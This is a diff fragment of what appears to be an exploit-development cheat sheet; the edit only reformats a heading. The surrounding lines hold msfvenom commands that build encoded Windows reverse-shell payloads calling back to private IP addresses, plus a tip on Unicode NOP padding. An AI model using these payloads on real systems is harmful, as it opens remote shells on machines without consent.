@@ -87,9 +87,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e g
 - Note: To keep things the same size, if needed add NOPs at the end of the payload.
 ### A Unicode NOP is - %u9090
 
-================================================================================
-===SHELLCODE GENERATION:
-================================================================================
+# SHELLCODE GENERATION:
+
 ```sh
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=80 EXITFUNC=thread -f python -a x86 --platform windows -b '\x00' -e x86/shikata_ga_nai
 ```
